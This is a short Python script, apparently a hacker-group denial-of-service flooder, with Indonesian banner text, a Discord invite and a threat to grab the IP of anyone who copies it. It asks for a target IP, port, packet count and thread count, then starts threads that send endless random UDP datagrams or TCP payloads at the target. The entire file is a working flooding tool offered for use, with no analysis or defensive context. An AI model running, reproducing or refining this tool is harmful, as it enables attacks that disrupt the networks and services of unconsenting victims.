#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > AUTHOR : PUSHY  CODE : PUSHY < - - ")
print       (" - - > 7740TEAM x PUSHY NIH BOS!! < - - ")
print       (" - - > AJARIN CUPU DONG BANG XIXI < - - ")
print       (" - - > franz & PushyGamertag27#7165 <- - ")                                   
print       (" - - > KALO MAU NYURI GW GRAB IP LU < - - ")
print       (" - - > PENCET LINK DIBAWAH AJG < - - ")
print       (" - - > https://discord.gg/cvsVwcwT66 < - - ")
print       (" - - > support us")
    
ip = str(input("  Ip Nya:"))
port = int(input(" Port Nya:"))
choice = str(input(" HANCURIN GAK NICH? (y/n):"))
times = int(input(" MAU BERAPA PAKET:"))
threads = int(input(" KIRIM BERAPA BARANGNYA:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" FRANZ x PUSHY NIH BOS !! ")
		except:
			print("[!] GASUKA BAYWAN DECK")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" KalzZ x LexsyonzZ NIH BOS !! ")
		except:
			s.close()
			print("[*] GASUKA BAYWAN DECK")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
